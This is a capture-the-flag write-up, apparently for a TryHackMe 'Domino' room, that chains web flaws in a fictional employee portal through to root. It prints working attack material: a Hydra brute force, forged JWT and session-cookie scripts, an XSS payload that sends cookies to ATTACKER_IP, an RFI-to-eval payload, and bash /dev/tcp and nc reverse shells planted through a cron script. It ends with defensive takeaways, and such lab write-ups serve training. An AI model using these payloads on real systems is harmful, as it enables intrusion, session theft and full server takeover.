# Domino 
 
**Category:** Web / Chained Vulnerabilities
**Target:** NexusCorp Employee Portal
 
## Recon
 
Nmap turned up exactly two open ports:
 
```
22/tcp  open  ssh   OpenSSH
80/tcp  open  http  Apache/2.4.58 (Ubuntu) — NexusCorp Portal
```
 
The web root is a clean employee login page — username format `firstname.lastname`, a password reset flow, and a link to an "Our Team" page.
 
`/team.php` requires no authentication and hands over the entire staff directory: full names, roles, departments, and emails — which conveniently confirms the username convention:
 
- laura.hayes — Chief Information Officer
- michael.chen — Lead Security Engineer
- sarah.johnson — Senior Software Engineer
- robert.wilson — DevOps Engineer
- emma.taylor — Product Manager
- david.brown — Full Stack Developer
- james.wright — Systems Administrator
A `gobuster` sweep of the web root surfaced the real attack surface:
 
```
/admin        → 301 (exists, gated)
/api          → 301 (auth/, users/, files.php, login.php)
/backup       → 301 (directory listing enabled!)
/support      → 301 (ticketing system)
```
 
---
 
## Step 1 — Directory Listing Leaks an Encrypted Config
 
`/backup/` has directory listing turned on, containing two files:
 
```
README.txt
config.enc
```
 
`README.txt` reads:
 
```
NexusCorp Backup Configuration
===============================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```
 
Convenient. `static/app.js` obliges:
 
```js
// Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    // Key: N3xusK3y2024!!  (pad to 16 bytes with \x00)
    _backupKey: 'N3xusK3y2024!!',
    appVersion: '2.3.1'
};
```
 
A hardcoded AES key, shipped in a comment, in a file every visitor's browser downloads. The key is 14 characters — padded to 16 bytes with two null bytes per the comment. Decrypting:
 
```bash
KEY_HEX=$(printf 'N3xusK3y2024!!\x00\x00' | xxd -p | tr -d '\n')
openssl enc -d -aes-128-ecb -in config.enc -K "$KEY_HEX" -out config_decrypted.txt
cat config_decrypted.txt
```
 
```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```
 
No credentials directly, but a critical piece of intel: there's an OS-level account called `devops` on the box. Filed away for later — it becomes the pivot point for privilege escalation.
 
---
 
## Step 2 — Cracking Initial Access
 
The login form and password-reset form were both tested for SQL injection and username enumeration; `forgot.php` leaks valid usernames (`"Reset link sent"` vs `"No account found"`), but SQLi attempts against both the reset form and the main login form failed — the queries appear to be parameterized.
 
With a confirmed username list in hand, a straightforward Hydra run against the login form did the job:
 
```bash
hydra -l robert.wilson -P /usr/share/wordlists/rockyou.txt 10.x.x.x \
  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials" -t 40 -f
```
 
```
[80][http-post-form] host: 10.x.x.x   login: robert.wilson   password: password
```
 
The DevOps engineer's password broke in seconds. Logging in as `robert.wilson` lands on a **user-role dashboard** — no admin panel, no flags yet. The dashboard does, however, advertise the next two dominoes directly:
 
```
File Viewer:  GET /api/files.php?name=[path]   (requires JWT via /api/auth/token.php)
```
 
The session cookie (`nexus_session`) decodes (base64) to:
 
```json
{"user_id":4,"username":"robert.wilson","role":"user"}
```
 
...followed by a `.` and a 64-character hex string — an HMAC-SHA256 signature. To reach admin, we need either Laura's password, or a way to forge this cookie — which means finding the signing secret.
 
---
 
## Step 3 — JWT Signature Verification Is Commented Out
 
Requesting a JWT as `robert.wilson`:
 
```bash
curl -s -b "nexus_session=<cookie>" http://target/api/auth/token.php
```
 
returns a real JWT (`header.payload.signature`, HS256) whose payload always reads `"role":"user"` — even when tested with a forged admin-role session cookie. This turned out to be a real bug in the source (confirmed later): `generate_jwt()` hardcodes `role => 'user'` regardless of the account's actual privileges.
 
Requesting `/api/files.php` with this legitimate but non-admin JWT returns:
 
```json
{"error":"Admin JWT required. Check your token payload."}
```
 
Cracking attempts against the HMAC secret — a curated list of ~100k known-weak JWT secrets, the full rockyou.txt via hashcat (`-m 16500`), and every app-specific guess (the AES key, "nexus", "jwt_secret", etc.) — all failed. The classic `alg: none` bypass was also tested and rejected (`403`).
 
The actual bug is subtler and much dumber: **the signature is never checked at all.** Forging a token with *any* signature — literally a base64-encoded string of garbage — and a normal `role: admin` claim, gets fully accepted:
 
```python
import hmac, hashlib, base64, json, time
 
def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 
header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
payload = b64url(json.dumps({
    "sub": "robert.wilson",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}, separators=(',', ':')))
 
sig = b64url("literally-anything-goes-here-garbage-signature")
 
print(f"{header}.{payload}.{sig}")
```
 
```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://target/api/files.php?name=test.txt"
```
 
The error changes from *"Admin JWT required"* to:
 
```json
{"error":"Access denied: path must be within /var/www/html/"}
```
 
Confirmation: the forged admin token was accepted. There's a path restriction to work around, but the auth check itself is dead.
 
---
 
## Step 4 — Full Source Disclosure via the File API
 
With the forged admin JWT and paths scoped to `/var/www/html/`, the app's own PHP source becomes readable:
 
```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://target/api/files.php?name=/var/www/html/config.php"
```
 
```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```
 
```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://target/api/files.php?name=/var/www/html/auth.php"
```
 
`auth.php` confirms everything found by trial and error:
 
```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = ...
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```
 
...and the session-role bug:
 
```php
function get_session() {
    ...
    // Role always fetched from DB - cookie role value ignored
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```
 
Interesting detail: the session cookie's `role` claim is *ignored* — the real role is always pulled fresh from the database by `user_id`. This is actually correct design... which means the only way to become admin via the cookie is to present `user_id: 1` (Laura's real DB row) with a **validly HMAC-signed** cookie, since `hash_equals()` on the session cookie *is* properly enforced (unlike the JWT). `APP_SECRET` from `config.php` solves that:
 
```python
import hmac, hashlib, base64, json
 
secret = b'nexus_app_k3y_2024'
payload = json.dumps({"user_id": 1, "username": "laura.hayes", "role": "admin"}, separators=(',', ':'))
b64 = base64.b64encode(payload.encode()).decode()
sig = hmac.new(secret, b64.encode(), hashlib.sha256).hexdigest()
print(f"{b64}.{sig}")
```
 
Dropping this into the `nexus_session` cookie and reloading `/dashboard.php`:
 
```
Welcome, laura.hayes
Role: admin
```
 
**🚩 Flag 1** — a separate IDOR was also present the whole time: `/api/users/profile.php?id=1`, reachable with *any* authenticated session (no ownership check on the `id` parameter), leaks Laura's `notes` field directly:
 
```json
{"id":1,"username":"laura.hayes","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
```
 
**Note:** an alternate, non-source-reading path to admin also exists in this room — a **stored XSS** in the support ticket system. The ticket "review" process is an automated bot (`admin_bot.py`, confirmed later via filesystem access) that scans new ticket text for URLs and fetches them with its own authenticated `requests.Session()`. A ticket message like:
 
```html
<script>fetch('http://ATTACKER_IP:8000/steal?c=' + document.cookie)</script>
```
 
causes the bot to extract and request that URL, forwarding its own session cookie in the process — handing over Laura's live, properly-signed `nexus_session` cookie directly. This also solves Flag 2 below without ever touching the AES key or JWT bug.
 
**🚩 Flag 2** — the admin panel (`/admin/index.php`) displays it directly on login:
 
```
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```
 
---
 
## Step 5 — RFI → RCE
 
`files.php` has one more trick: if `name` starts with `http://`, it fetches the URL and `eval()`s the response after stripping the opening `<?php` tag:
 
```php
if (strpos($name, "http://") === 0) {
    $remote = @file_get_contents($name);
    eval(str_replace("<?php", "", $remote));
}
```
 
Remote File Inclusion straight into `eval()`. Hosting a payload locally:
 
```bash
mkdir /tmp/serve && cd /tmp/serve
echo '<?php echo shell_exec("cat /opt/flag3.txt"); ?>' > flag3.php
python3 -m http.server 8888
```
 
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/files.php?name=http://ATTACKER_IP:8888/flag3.php"
```
 
**🚩 Flag 3:**
```
THM{rf1_2_rc3_f00th0ld_fl4g3}
```
 
Upgrading to a full reverse shell is the same vector, different payload:
 
```bash
echo '<?php system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""); ?>' > shell.php
```
 
```bash
nc -lvnp 4444
# in another terminal:
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/files.php?name=http://ATTACKER_IP:8888/shell.php"
```
 
```
www-data@tryhackme:/var/www/html/api$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
 
---
 
## Step 6 — Password Reuse → devops
 
The DB password extracted from `config.php` earlier (`D3v0ps!2024`) turns out to be reused verbatim as the OS password for the `devops` system account identified all the way back in Step 1:
 
```bash
su devops
Password: D3v0ps!2024
```
 
```
devops@tryhackme:/opt$ id
uid=1001(devops) ...
```
 
**🚩 Flag 4** (devops home directory):
```
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```
 
---
 
## Step 7 — Cron Privilege Escalation → Root
 
Checking what root does periodically on this box:
 
```bash
ls -la /opt/monitoring/
```
 
```
-rwxrwxr-- 1 root devops  127 health_report.sh
```
 
Owned by `root`, group `devops`, and **group-writable**. A root-run cron job (confirmed with `pspy64` — fires every 60 seconds) executes this script as `root`. Since we're now in the `devops` group, we can simply overwrite it:
 
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 9999 >/tmp/f' \
  > /opt/monitoring/health_report.sh
```
 
```bash
nc -lvnp 9999
# wait up to 60 seconds
```
 
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
 
**🚩 Flag 5 (root):**
```
THM{pr1v3sc_cr0n_r00t_fl4g5}
```
 
---
 
## Full Vulnerability Chain
 
| # | Vulnerability | Impact |
|---|---|---|
| V1 | Hardcoded AES key in frontend JS (`app.js`) | Decrypted backup config, leaked `system_user: devops` |
| V2 | Weak password (`robert.wilson` / `password`) | Cracked in seconds via Hydra — initial authenticated access |
| V3 | JWT signature verification commented out (`auth.php`) | Any forged JWT with `role: admin` accepted, regardless of signature |
| V4 | Unrestricted-enough file read via JWT-authenticated API (scoped to `/var/www/html/`) | Full PHP source disclosure — DB creds, `JWT_SECRET`, `APP_SECRET` |
| V5 | IDOR on `/api/users/profile.php?id=` | Any authenticated user can read any other user's profile/notes |
| V6 | Stored XSS in support tickets, auto-reviewed by an authenticated bot | Session hijack — steals a live admin cookie |
| V7 | Forgeable session cookie (once `APP_SECRET` is known) | Full admin impersonation |
| V8 | RFI + `eval()` in `files.php` | Remote code execution as `www-data` |
| V9 | Password reuse (DB password = OS password for `devops`) | Lateral movement / privilege escalation |
| V10 | World-writable root cron script | Trivial privilege escalation to `root` |
 
---
 
## Key Takeaways
 
1. **Never ship secrets in frontend JavaScript** — not even "temporarily." The TODO comment in `app.js` said "move to env before prod deployment." It never happened, and it started the entire chain.
2. **Signature verification exists for a reason.** A commented-out `hash_equals()` call turns a cryptographically signed token into base64-encoded wishful thinking. It doesn't matter how strong the actual secret is if the check itself never runs.
3. **File-reading APIs need real path validation** — `realpath()` + an allow-list, not a prefix string match that can still be satisfied by attacker-controlled input.
4. **`eval()` on remote content is never acceptable**, full stop. If you need remote configuration, parse it as data (JSON), never execute it as code.
5. **IDOR checks matter on every object reference** — a `role: admin` gate on a *page* doesn't help if the *API* underneath has no per-object ownership check.
6. **Automated bots that fetch user-supplied URLs need the same input hygiene as a browser rendering user content.** An "admin review" script that blindly requests any link it finds is SSRF and session-leak risk rolled into one.
7. **Rotate secrets independently.** One DB password reused as an OS account password turned a single leak into full lateral movement.
8. **Audit permissions on anything a root cron touches.** `find /etc/cron* /opt -type f -perm -o+w` (or group-writable, checked against the executing user) should be part of every hardening pass.
---
 
*Writeup for the "Domino" room — a great reminder that defense in depth means every layer has to hold, not just the one you're staring at.*
